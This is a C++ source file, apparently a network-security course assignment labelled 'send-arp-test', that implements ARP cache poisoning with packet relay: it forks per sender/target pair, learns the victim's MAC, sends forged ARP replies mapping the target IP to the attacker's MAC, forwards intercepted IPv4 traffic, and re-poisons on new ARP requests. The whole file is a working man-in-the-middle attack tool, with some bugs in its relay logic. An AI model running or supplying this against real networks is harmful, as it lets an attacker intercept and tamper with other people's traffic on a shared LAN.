#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <netinet/if_ether.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include "lihd.h"
#include <sys/wait.h>

#pragma pack(push, 1)
struct EthArpPacket final
{
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

void usage()
{
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

void getMAC(char *iface, unsigned char *mac)
{
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	close(fd);
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
}
void getIP(char *iface, char *ip)
{
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	strcpy(ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

int main(int argc, char *argv[])
{
	for (int i = 2; i < argc; i += 2)
	{
		pid_t pid = fork();
		if (pid == 0)
		{
			while (1)
			{
				if (argc % 2 != 0)
				{
					fprintf(stderr, "Please give me more ip\n");
					exit(1);
				}
				if (i >= argc)
					break;

				char *dev = argv[1];
				char errbuf[PCAP_ERRBUF_SIZE];
				pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
				char Smac[18];
				if (handle == nullptr)
				{
					fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
					return -1;
				}
				unsigned char mac[ETHER_ADDR_LEN];
				getMAC(argv[1], mac);
				char macStr[18];
				sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
				printf("MAC: %s\n", macStr);

				char ip[20];
				getIP(argv[1], ip);
				printf("IP: %s\n", ip);

				EthArpPacket packet;
				packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
				packet.eth_.smac_ = Mac(macStr);
				packet.eth_.type_ = htons(EthHdr::Arp);
				packet.arp_.hrd_ = htons(ArpHdr::ETHER);
				packet.arp_.pro_ = htons(EthHdr::Ip4);
				packet.arp_.hln_ = Mac::SIZE;
				packet.arp_.pln_ = Ip::SIZE;
				packet.arp_.op_ = htons(ArpHdr::Request);
				packet.arp_.smac_ = Mac(macStr);
				packet.arp_.sip_ = htonl(Ip(ip));
				packet.arp_.tmac_ = Mac("00-00-00-00-00-00");
				packet.arp_.tip_ = htonl(Ip(argv[i]));

				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
				if (res != 0)
				{
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}

				while (true)
				{

					// pcap에서 참고
					struct pcap_pkthdr *header;
					const u_char *reply_packet;
					int result = pcap_next_ex(handle, &header, &reply_packet);
					if (result != 1)
					{
						continue;
					}

					EthArpPacket *reply = (EthArpPacket *)reply_packet;

					if (ntohs(reply->eth_.type_) == EthHdr::Arp &&
						ntohs(reply->arp_.op_) == ArpHdr::Reply &&
						reply->arp_.sip_ == packet.arp_.tip_ &&
						reply->arp_.tip_ == packet.arp_.sip_)
					{

						strcpy(Smac, std::string(reply->arp_.smac_).c_str());
						printf("Found target MAC address: %s\n", std::string(reply->arp_.smac_).c_str());
						break;
					}
				}

				EthArpPacket rppacket;
				rppacket.eth_.dmac_ = Mac(Smac);
				rppacket.eth_.smac_ = Mac(macStr);
				rppacket.eth_.type_ = htons(EthHdr::Arp);
				rppacket.arp_.hrd_ = htons(ArpHdr::ETHER);
				rppacket.arp_.pro_ = htons(EthHdr::Ip4);
				rppacket.arp_.hln_ = Mac::SIZE;
				rppacket.arp_.pln_ = Ip::SIZE;
				rppacket.arp_.op_ = htons(ArpHdr::Reply);
				rppacket.arp_.smac_ = Mac(macStr);
				rppacket.arp_.sip_ = htonl(Ip(argv[i + 1]));
				rppacket.arp_.tmac_ = Mac(Smac);
				rppacket.arp_.tip_ = htonl(Ip(argv[i]));

				int rpres = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&rppacket), sizeof(EthArpPacket));
				while (true)
				{
					struct pcap_pkthdr *header;
					const u_char *re_packet;
					int res = pcap_next_ex(handle, &header, &re_packet);

					u_char *relay_packet = new u_char[header->len];
					memcpy(relay_packet, re_packet, header->len);
					libnet_ethernet_hdr *eth_hdr = (libnet_ethernet_hdr *)re_packet;
					libnet_ipv4_hdr *ipv4_hdr = (libnet_ipv4_hdr *)(re_packet + 14);

					if (ipv4_hdr->ip_dst.s_addr == htonl(Ip(argv[i + 1])))
					{
						for (int i = 0; i < 6; i++)
						{
							relay_packet[i] = Smac[i];
						}

						res = pcap_sendpacket(handle, relay_packet, header->len);
						if (res != 0)
						{
							fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
						}
					}
					if ((ntohs(eth_hdr->ether_type) == 0x0806))
					{
						EthArpPacket *tmp_eth = (EthArpPacket *)(re_packet);
						if (tmp_eth->arp_.tip_ == Ip(htonl(Ip(argv[i + 1]))) && (tmp_eth->arp_.op_ == htons(ArpHdr::Request)))
						{
							res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&rppacket), sizeof(EthArpPacket));
							if (res != 0)
							{
								fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
							}
						}
					}
				}
				i += 2;
				pcap_close(handle);
			}
		}
		else if (pid < 0)
		{
			fprintf(stderr, "fork failed\n");
			return -1;
		}
	}

	for (int i = 2; i < argc; i += 2)
	{
		wait(NULL);
	}
	int i = 2;
}